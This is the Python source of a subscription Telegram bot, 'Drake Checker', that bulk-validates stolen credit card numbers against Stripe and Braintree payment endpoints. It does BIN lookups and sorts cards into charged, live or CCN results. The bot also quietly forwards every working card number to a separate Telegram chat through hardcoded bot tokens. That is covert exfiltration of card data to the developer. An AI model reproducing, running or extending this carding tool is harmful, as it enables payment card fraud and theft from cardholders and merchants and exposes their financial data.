import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
import urllib.parse
import sys
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from keep_alive import keep_alive
keep_alive()
stopuser = {}
token = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin=5102323588
admin2=6574060333
f = Faker()
name = f.name()
street = f.address()
city = f.city()
state = f.state()
postal = f.zipcode()
phone = f.phone_number()
coun = f.country()
mail = f.email()
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			ahmedhusien = types.InlineKeyboardMarkup(row_width=1)
			ahmed = types.InlineKeyboardButton(text="Commands", url="https://t.me")
			contact_button = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
			keyboard.add(contact_button, ahmed)
			video_url = f'https://t.me/kaxyassets/4'
			bot.send_message(chat_id=message.chat.id, text=f'''<b>Hello {name}, Welcome to Drake Checker!
			
👾 Status: Alive [BETA] 

Your current Plan is {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Developer", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		video_url = f'https://t.me/kaxyassets/4'
		bot.send_video(chat_id=message.chat.id, video=video_url, caption='''<b>Hello, Welcome to Drake Checker! 💫

👾 Status: Alive [BETA]

Use /cmds to know my endless potential! 💪🏻</b>
''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"PLAN: {BL}",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗗𝗿𝗮𝗸𝗲'𝘀 𝗚𝗮𝘁𝗲 𝗖𝗺𝗱𝘀!
━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
• 𝗨𝘀𝗮𝗴𝗲: /chk
• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗡 ✅
━━━━━━━━━━━━
𝟯𝗗 𝗟𝗼𝗼𝗸-𝗨𝗽
• 𝗨𝘀𝗮𝗴𝗲: /vbv
• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗡 ✅
━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
• 𝗨𝘀𝗮𝗴𝗲: /au
• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗙𝗙 ❌
━━━━━━━━━━━━
𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲
• 𝗨𝘀𝗮𝗴𝗲: /str
• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗙𝗙 ❌
━━━━━━━━━━━━
𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲𝘀 (𝗕𝟯 & 𝗦𝘁𝗿𝗶𝗽𝗲)
• 𝗨𝘀𝗮𝗴𝗲: /mchk 
• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗡 ✅
━━━━━━━━━━━━
→ 𝗖𝗼𝘂𝗻𝘁 𝟲</b>
''',reply_markup=keyboard)
@bot.message_handler(commands=["mchk"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"PLAN: {BL}",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b>Please send the .txt file with ccs for checking</b>
''',reply_markup=keyboard)
@bot.message_handler(commands=['hq'])
@bot.message_handler(func=lambda message: message.text.lower().startswith('.hq'))
def handle_cc(message):
    user_id = message.from_user.id
    current_time = time.time()

    if user_id not in OWNER_USERS and user_id not in PREMIUM_USERS:
        if user_id in last_hq_time and current_time - last_hq_time[user_id] < 86400:
            bot.send_message(message.chat.id, "You are blocked for exceeding the daily limit of credit card checks.", reply_to_message_id=message.message_id, parse_mode="Markdown")
            return

    if user_id not in OWNER_USERS and user_id not in PREMIUM_USERS:
        if user_id in cc_count and cc_count[user_id] >= 25:
            bot.send_message(message.chat.id, "You have exceeded the total limit of credit card checks. You are blocked for 1 day.", reply_to_message_id=message.message_id, parse_mode="Markdown")
            last_hq_time[user_id] = current_time
            return

    if user_id not in OWNER_USERS and user_id not in PREMIUM_USERS:
        if user_id in last_hq_time and current_time - last_hq_time[user_id] < 30:
            remaining_time = 30 - int(current_time - last_hq_time[user_id])
            bot.send_message(message.chat.id, f"Please wait {remaining_time} seconds before using /hq again.", reply_to_message_id=message.message_id, parse_mode="Markdown")
            return

    if user_id in REGISTERED_USERS:
        try:
            cc, mes, ano, cvv = message.text.split()[1].split("|")

            result = stripe3(cc, mes, ano, cvv)

            if user_id in OWNER_USERS:
                user_type = "<b> OWNER </b>"
            elif user_id in PREMIUM_USERS:
                user_type = "<b> VIP MAGICIAN </b>"
            else:
                user_type = "〚𝘍𝘙𝘌𝘌〛"
            message_text = f"{result}\nRole:{user_type}"

            bot.send_message(message.chat.id, message_text, reply_to_message_id=message.message_id, parse_mode="Markdown")

            cc_count[user_id] = cc_count.get(user_id, 0) + 1

            last_hq_time[user_id] = current_time
        except Exception as e:
            bot.send_message(message.chat.id, f"Please enter like this : /hq credit_card_number|expiration_month|expiration_year|cvv")
    else:
        bot.send_message(message.chat.id, "SEEMS LIKE YOU ARE NOT REGISTERED, USE /register TO START YOUR JOURNEY.", reply_to_message_id=message.message_id, parse_mode="Markdown")

def tokenize_credit_card(card_number, exp_month, exp_year, cvc, publishable_key):
    try:
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {
            "card[number]": card_number,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[cvc]": cvc
        }

        response = requests.post("https://api.stripe.com/v1/tokens", headers=headers, data=data)

        if response.status_code == 200:
            return response.json()["id"]
        else:
            print(f"Error: {response.json()['error']['message']}")
            return None
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        return None

def pm_credit_card(card_number, exp_month, exp_year, cvc, publishable_key):
    try:
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[exp_month]': exp_month,
            'card[exp_year]': exp_year,
            'card[cvc]': cvc,
        }

        # Encode the data in the appropriate format
        encoded_data = urllib.parse.urlencode(data)

        response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=encoded_data)

        if response.status_code == 200:
            return response.json()["id"]
        else:
            print(f"Error: {response.json()['error']['message']}")
            return None
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        return None
@bot.message_handler(commands=["buy"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"PLAN: {BL}",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗕𝗢𝗧 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
𝟭 𝗪𝗘𝗘𝗞 » $𝟲  
𝟭 𝗠𝗢𝗡𝗧𝗛 » $𝟭𝟮 
𝗟𝗜𝗙𝗘𝗧𝗜𝗠𝗘 » $𝟯𝟲</b>''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
			ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
			contact_button = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
			contact_button = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>Uh oh! Seems like your subscription is expired, please contact admin to renew it</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"💀 BRAINTREE AUTH 💀",callback_data='br')
		sw = types.InlineKeyboardButton(text=f"🪽 STRIPE AUTH 🪽",callback_data='str')
		keyboard.add(contact_button)
		keyboard.add(sw)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'str')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲'
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "Processing the file...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 ✅')
						return
					try:
						data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
					except:
						pass
					try:
					    level=(data['level'])
					except:
					    level=('unknown')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('unknown')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('unknown')
					try:
						country=(data['country']['name'])
					except:
						country=('unknown')
					try:
						brand=(data['scheme'])
					except:
						brand=('unknown')
					try:
						card_type=(data['type'])
					except:
						card_type=('unknown')
					try:
						url=(data['bank']['url'])
					except:
						url=('unknown')
					
					start_time = time.time()
					try:
						last = str(st(cc))
					except Exception as e:
						print(e)
						last = "We are working on updating the portal"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='live'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 » {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅ » [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝗖𝗖𝗡 👍🏻 » [ {ccnn} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 👎🏻 » [ {live} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ » [ {dd} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 🗑️ » [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝘄𝗵𝗶𝗹𝗲 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱𝘀 𝗮𝗿𝗲 𝗯𝗲𝗶𝗻𝗴 𝗰𝗵𝗲𝗰𝗸𝗲𝗱
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: {gate}''', reply_markup=mes)

					msg=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
					msgc=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗖𝗡 👍🏻
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
					msgf=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀 👎🏻
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
					if 'success' in last:
						tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
						acc =  '2201722670'
						mg = f"""<b> ❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆ 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ch += 1
						bot.send_message(call.from_user.id, msg)
					elif "funds" in last:
						tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
						acc =  '-4248306465'
						mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif "card's security" in last:
						tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
						acc =  '-4248306465'
						mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(0)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "Processing the file...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 ✅')
						return
					try:
						data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
						
						
					except:
						pass
					try:
						level=(data['level'])
					except:
												level=('unknown')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('unknown')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('unknown')
					try:
						country=(data['country']['name'])
					except:
						country=('unknown')
					try:
						brand=(data['scheme'])
					except:
						brand=('unknown')
					try:
						card_type=(data['type'])
					except:
						card_type=('unknown')
					try:
						url=(data['bank']['url'])
					except:
						url=('unknown')
					
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• STATUS » {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• Approved ✅:  [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• CCN 👍🏻: [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• Declined ❌:  [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• Risk 👎🏻: [ {riskk} ] •", callback_data='x') 
					cm5 = types.InlineKeyboardButton(f"• Total🗑️: [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ STOP ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝘄𝗵𝗶𝗹𝗲 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱𝘀 𝗮𝗿𝗲 𝗯𝗲𝗶𝗻𝗴 𝗰𝗵𝗲𝗰𝗸𝗲𝗱
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: {gate}''', reply_markup=mes)
					
					msg=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}		
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
𝗜𝗻𝗳𝗼 » <code>{cc[:6]} - {card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)}
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
					msgc=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗖𝗡 👍🏻
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}		
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
𝗜𝗻𝗳𝗼 » <code>{cc[:6]} - {card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)}
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						tok ='7103663429:AAHshq4iqHzboZucTQnhO3EqZ7akeews--E'
						acc =  '-4248306465'
						mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
						bot.send_message(call.from_user.id, risk)
					elif 'CVV' in last:
						tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
						acc =  '-4248306465'
						mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(0)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.au') or message.text.lower().startswith('/au'))
def respond_to_vbv(message):
	gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
